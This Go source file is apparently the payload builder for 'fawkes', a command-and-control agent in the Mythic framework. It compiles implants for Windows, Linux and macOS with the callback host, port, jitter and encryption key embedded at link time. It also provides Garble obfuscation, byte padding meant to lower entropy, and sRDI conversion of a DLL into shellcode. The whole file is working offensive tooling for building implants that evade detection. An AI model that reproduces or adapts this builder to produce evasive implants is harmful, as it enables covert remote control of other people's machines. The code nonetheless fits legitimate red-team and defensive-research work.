package agentfunctions

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/MythicAgents/merlin/Payload_Type/merlin/container/pkg/srdi"
	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

// convertDllToShellcode uses Merlin's Go-based sRDI to convert a DLL to position-independent shellcode
func convertDllToShellcode(dllBytes []byte, functionName string, clearHeader bool) ([]byte, error) {
	// Use Merlin's Go sRDI implementation - same as working Merlin agent
	shellcode := srdi.DLLToReflectiveShellcode(dllBytes, functionName, clearHeader, "")
	
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("sRDI conversion produced empty shellcode")
	}
	
	return shellcode, nil
}

// is64BitDLL checks if the DLL is 64-bit by examining the PE header
func is64BitDLL(dllBytes []byte) bool {
	if len(dllBytes) < 64 {
		return false
	}
	
	// Get offset to PE header from bytes 60-64
	headerOffset := binary.LittleEndian.Uint32(dllBytes[60:64])
	if int(headerOffset)+6 > len(dllBytes) {
		return false
	}
	
	// Read machine type from PE header
	machine := binary.LittleEndian.Uint16(dllBytes[headerOffset+4 : headerOffset+6])
	
	// 0x8664 = AMD64, 0x0200 = IA64
	return machine == 0x8664 || machine == 0x0200
}

var payloadDefinition = agentstructs.PayloadType{
	Name:                                   "fawkes",
	FileExtension:                          "bin",
	Author:                                 "@galoryber",
	SupportedOS:                            []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
	Wrapper:                                false,
	CanBeWrappedByTheFollowingPayloadTypes: []string{},
	SupportsDynamicLoading:                 false,
	Description:                            "fawkes agent",
	SupportedC2Profiles:                    []string{"http"},
	MythicEncryptsData:                     true,
	MessageFormat:                          agentstructs.MessageFormatJSON,
	BuildParameters: []agentstructs.BuildParameter{
		{
			Name:          "mode",
			Description:   "Choose the build mode option. Select default for executables, shared for a .dll or .so file,  shellcode to use sRDI to convert the DLL to windows shellcode",
			Required:      false,
			DefaultValue:  "default-executable",
			Choices:       []string{"default-executable", "shared", "windows-shellcode"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		},
		{
			Name:          "architecture",
			Description:   "Choose the agent's architecture",
			Required:      false,
			DefaultValue:  "amd64",
			Choices:       []string{"amd64", "386", "arm", "arm64", "mips", "mips64"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		},
		{
			Name:          "garble",
			Description:   "Use Garble to obfuscate the output Go executable.\nWARNING - This significantly slows the agent build time.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
		},
		{
			Name:          "inflate_bytes",
			Description:   "Optional: Hex bytes to inflate binary with (e.g. 0x90 or 0x41,0x42). Used with inflate_count to lower entropy or increase file size.",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
		{
			Name:          "inflate_count",
			Description:   "Optional: Number of times to repeat the inflate bytes (e.g. 3000 = 3000 repetitions of the byte pattern).",
			Required:      false,
			DefaultValue:  "",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
		},
	},
	BuildSteps: []agentstructs.BuildStep{
		{
			Name:        "Configuring",
			Description: "Cleaning up configuration values and generating the golang build command",
		},

		{
			Name:        "Compiling",
			Description: "Compiling the golang agent (maybe with obfuscation via garble)",
		},
		{
			Name:        "Reporting back",
			Description: "Sending the payload back to Mythic",
		},
	},
}

func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResponse {
	payloadBuildResponse := agentstructs.PayloadBuildResponse{
		PayloadUUID:        payloadBuildMsg.PayloadUUID,
		Success:            true,
		UpdatedCommandList: &payloadBuildMsg.CommandList,
	}

	if len(payloadBuildMsg.C2Profiles) > 1 || len(payloadBuildMsg.C2Profiles) == 0 {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = "Failed to build - must select only one C2 Profile at a time"
		return payloadBuildResponse
	}
	macOSVersion := "10.12"
	targetOs := "linux"
	if payloadBuildMsg.SelectedOS == "macOS" {
		targetOs = "darwin"
	} else if payloadBuildMsg.SelectedOS == "Windows" {
		targetOs = "windows"
	}
	// This package path is used with Go's "-X" link flag to set the value string variables in code at compile
	// time. This is how each profile's configurable options are passed in.
	fawkes_main_package := "main"

	// Build Go link flags that are passed in at compile time through the "-ldflags=" argument
	// https://golang.org/cmd/link/
	ldflags := fmt.Sprintf("-s -w -X '%s.payloadUUID=%s'", fawkes_main_package, payloadBuildMsg.PayloadUUID)
	// Iterate over the C2 profile parameters and associate variables through Go's "-X" link flag
	for _, key := range payloadBuildMsg.C2Profiles[0].GetArgNames() {
		if key == "AESPSK" {
			cryptoVal, err := payloadBuildMsg.C2Profiles[0].GetCryptoArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			ldflags += fmt.Sprintf(" -X '%s.encryptionKey=%s'", fawkes_main_package, cryptoVal.EncKey)
		} else if key == "callback_host" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			ldflags += fmt.Sprintf(" -X '%s.callbackHost=%s'", fawkes_main_package, val)
		} else if key == "callback_port" {
			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			ldflags += fmt.Sprintf(" -X '%s.callbackPort=%s'", fawkes_main_package, fmt.Sprintf("%d", int(val)))
		} else if key == "callback_interval" {
			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			ldflags += fmt.Sprintf(" -X '%s.sleepInterval=%s'", fawkes_main_package, fmt.Sprintf("%d", int(val)))
		} else if key == "callback_jitter" {
			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			ldflags += fmt.Sprintf(" -X '%s.jitter=%s'", fawkes_main_package, fmt.Sprintf("%d", int(val)))
		} else if key == "headers" {
			headerMap, err := payloadBuildMsg.C2Profiles[0].GetDictionaryArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			if userAgentVal, exists := headerMap["User-Agent"]; exists {
				ldflags += fmt.Sprintf(" -X '%s.userAgent=%s'", fawkes_main_package, userAgentVal)
			}
		} else if key == "get_uri" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			ldflags += fmt.Sprintf(" -X '%s.getURI=%s'", fawkes_main_package, val)
		} else if key == "post_uri" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = err.Error()
				return payloadBuildResponse
			}
			ldflags += fmt.Sprintf(" -X '%s.postURI=%s'", fawkes_main_package, val)
		}
	}
	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
	if err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = err.Error()
		return payloadBuildResponse
	}
	mode, err := payloadBuildMsg.BuildParameters.GetStringArg("mode")
	if err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = err.Error()
		return payloadBuildResponse
	}
	garble, err := payloadBuildMsg.BuildParameters.GetBooleanArg("garble")
	if err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = err.Error()
		return payloadBuildResponse
	}
	// Add debug flag
	ldflags += fmt.Sprintf(" -X '%s.debug=%s'", fawkes_main_package, "false")
	ldflags += " -buildid="

	// Handle binary inflation (padding)
	inflateBytes, _ := payloadBuildMsg.BuildParameters.GetStringArg("inflate_bytes")
	inflateCount, _ := payloadBuildMsg.BuildParameters.GetStringArg("inflate_count")
	paddingFile := "./fawkes/agent_code/padding.bin"
	fmt.Printf("[builder] inflate_bytes='%s' inflate_count='%s'\n", inflateBytes, inflateCount)

	if inflateBytes != "" && inflateCount != "" {
		count, countErr := strconv.Atoi(strings.TrimSpace(inflateCount))
		if countErr != nil || count <= 0 {
			// Invalid count, write default 1-byte padding
			os.WriteFile(paddingFile, []byte{0x00}, 0644)
		} else {
			// Parse hex bytes like "0x41,0x42" or "0x90"
			hexParts := strings.Split(inflateBytes, ",")
			var bytePattern []byte
			for _, part := range hexParts {
				part = strings.TrimSpace(part)
				part = strings.TrimPrefix(part, "0x")
				part = strings.TrimPrefix(part, "0X")
				val, parseErr := strconv.ParseUint(part, 16, 8)
				if parseErr != nil {
					payloadBuildResponse.Success = false
					payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to parse inflate byte '%s': %v", part, parseErr)
					return payloadBuildResponse
				}
				bytePattern = append(bytePattern, byte(val))
			}
			// Build the full padding data by repeating the pattern count times
			paddingData := make([]byte, 0, len(bytePattern)*count)
			for i := 0; i < count; i++ {
				paddingData = append(paddingData, bytePattern...)
			}
			if writeErr := os.WriteFile(paddingFile, paddingData, 0644); writeErr != nil {
				payloadBuildResponse.Success = false
				payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to write padding file: %v", writeErr)
				return payloadBuildResponse
			}
			// Verify the file was written correctly
			if fi, statErr := os.Stat(paddingFile); statErr == nil {
				fmt.Printf("[builder] Generated padding.bin: %d bytes (%d repetitions of %d-byte pattern), file on disk: %d bytes\n", len(paddingData), count, len(bytePattern), fi.Size())
			} else {
				fmt.Printf("[builder] Generated padding.bin: %d bytes (%d repetitions of %d-byte pattern), stat error: %v\n", len(paddingData), count, len(bytePattern), statErr)
			}
		}
	} else {
		// No inflation requested, write minimal default
		fmt.Printf("[builder] No inflation requested, writing default 1-byte padding.bin\n")
		os.WriteFile(paddingFile, []byte{0x00}, 0644)
	}
	// Defer cleanup: restore default padding.bin after build completes
	defer os.WriteFile(paddingFile, []byte{0x00}, 0644)

	goarch := architecture
	tags := payloadBuildMsg.C2Profiles[0].Name
	command := fmt.Sprintf("rm -rf /deps; go clean -cache 2>/dev/null; CGO_ENABLED=0 GOOS=%s GOARCH=%s ", targetOs, goarch)
	buildmodeflag := "default"
	if mode == "shared" || mode == "windows-shellcode" {
		buildmodeflag = "c-shared"
		tags += ",shared" // Add shared tag to include exports.go
		command = strings.Replace(command, "CGO_ENABLED=0", "CGO_ENABLED=1", 1)
	}
	goCmd := fmt.Sprintf("-tags %s -buildmode %s -ldflags \"%s\"", tags, buildmodeflag, ldflags)
	if mode == "shared" || mode == "windows-shellcode" {
		if targetOs == "darwin" {
			command += "CC=o64-clang CXX=o64-clang++ "
		} else if targetOs == "windows" {
			command += "CC=x86_64-w64-mingw32-gcc "
		} else {
			if goarch == "arm64" {
				command += "CC=aarch64-linux-gnu-gcc "
			}
		}
	}
	// Enable CGO for Windows builds (needed for go-coff BOF execution)
	if targetOs == "windows" && mode != "shared" {
		command = strings.Replace(command, "CGO_ENABLED=0", "CGO_ENABLED=1", 1)
		if goarch == "amd64" {
			command += "CC=x86_64-w64-mingw32-gcc "
		} else if goarch == "386" {
			command += "CC=i686-w64-mingw32-gcc "
		}
	}
	command += "GOGARBLE=* "
	if garble {
		command += "/go/bin/garble -tiny -literals -debug -seed random build "
	} else {
		command += "go build "
	}
	payloadName := fmt.Sprintf("%s-%s", payloadBuildMsg.PayloadUUID, targetOs)
	if targetOs == "darwin" {
		payloadName += fmt.Sprintf("-%s", macOSVersion)
	}
	payloadName += fmt.Sprintf("-%s", goarch)

	// Add file extension based on mode before constructing the build command
	if mode == "shared" {
		if targetOs == "windows" {
			payloadName += ".dll"
		} else if targetOs == "darwin" {
			payloadName += ".dylib"
		} else {
			payloadName += ".so"
		}
	} else if mode == "windows-shellcode" {
		payloadName += ".dll"
		// need a DLL for the dll to shellcode conversion later
		// TODO - merlin sRDI for dll to shellcode option
	}

	command += fmt.Sprintf("%s -o /build/%s .", goCmd, payloadName)

	// Build configuring step output with padding info
	configuringOutput := fmt.Sprintf("Successfully configured\n%s", command)
	if inflateBytes != "" && inflateCount != "" {
		configuringOutput += fmt.Sprintf("\nBinary inflation: bytes=%s count=%s", inflateBytes, inflateCount)
	}
	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
		PayloadUUID: payloadBuildMsg.PayloadUUID,
		StepName:    "Configuring",
		StepSuccess: true,
		StepStdout:  configuringOutput,
	})
	cmd := exec.Command("/bin/bash")
	fmt.Println("build command : " + command)
	cmd.Stdin = strings.NewReader(command)
	cmd.Dir = "./fawkes/agent_code/"
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildMessage = "Compilation failed with errors"
		payloadBuildResponse.BuildStdErr = stderr.String() + "\n" + err.Error()
		payloadBuildResponse.BuildStdOut = stdout.String()
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "Compiling",
			StepSuccess: false,
			StepStdout:  fmt.Sprintf("failed to compile\n%s\n%s\n%s", stderr.String(), stdout.String(), err.Error()),
		})
		return payloadBuildResponse
	} else {
		outputString := stdout.String()
		if !garble {
			// only adding stderr if garble is false, otherwise it's too much data
			outputString += "\n" + stderr.String()
		}

		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "Compiling",
			StepSuccess: true,
			StepStdout:  fmt.Sprintf("Successfully executed\n%s", outputString),
		})
	}
	if !garble {
		payloadBuildResponse.BuildStdErr = stderr.String()
	}
	payloadBuildResponse.BuildStdOut = stdout.String()
	if payloadBytes, err := os.ReadFile(fmt.Sprintf("/build/%s", payloadName)); err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildMessage = "Failed to find final payload"
	} else if mode == "windows-shellcode" {
		// Convert DLL to shellcode using sRDI
		// Use "Run" function and clearHeader=true to match Merlin configuration
		shellcode, err := convertDllToShellcode(payloadBytes, "Run", true)
		if err != nil {
			payloadBuildResponse.Success = false
			payloadBuildResponse.BuildMessage = fmt.Sprintf("Failed to convert DLL to shellcode: %v", err)
			payloadBuildResponse.BuildStdErr += fmt.Sprintf("\nShellcode conversion error: %v", err)
		} else {
			payloadBuildResponse.Payload = &shellcode
			payloadBuildResponse.Success = true
			payloadBuildResponse.BuildMessage = "Successfully built shellcode payload!"
			// Set proper file extension
			extension := "bin"
			filename := fmt.Sprintf("fawkes.%s", extension)
			payloadBuildResponse.UpdatedFilename = &filename
		}
	} else {
		payloadBuildResponse.Payload = &payloadBytes
		payloadBuildResponse.Success = true
		payloadBuildResponse.BuildMessage = "Successfully built payload!"
		// Set proper file extension based on mode
		extension := "bin"
		if mode == "shared" {
			if targetOs == "windows" {
				extension = "dll"
			} else if targetOs == "darwin" {
				extension = "dylib"
			} else {
				extension = "so"
			}
		} else {
			// default-executable mode
			if targetOs == "windows" {
				extension = "exe"
			} else {
				extension = "bin"
			}
		}
		filename := fmt.Sprintf("fawkes.%s", extension)
		payloadBuildResponse.UpdatedFilename = &filename
	}

	//payloadBuildResponse.Status = agentstructs.PAYLOAD_BUILD_STATUS_ERROR
	return payloadBuildResponse
}

func Initialize() {
	agentstructs.AllPayloadData.Get("fawkes").AddPayloadDefinition(payloadDefinition)
	agentstructs.AllPayloadData.Get("fawkes").AddBuildFunction(build)
	agentstructs.AllPayloadData.Get("fawkes").AddIcon(filepath.Join(".", "fawkes", "agentfunctions", "fawkes.svg"))
}
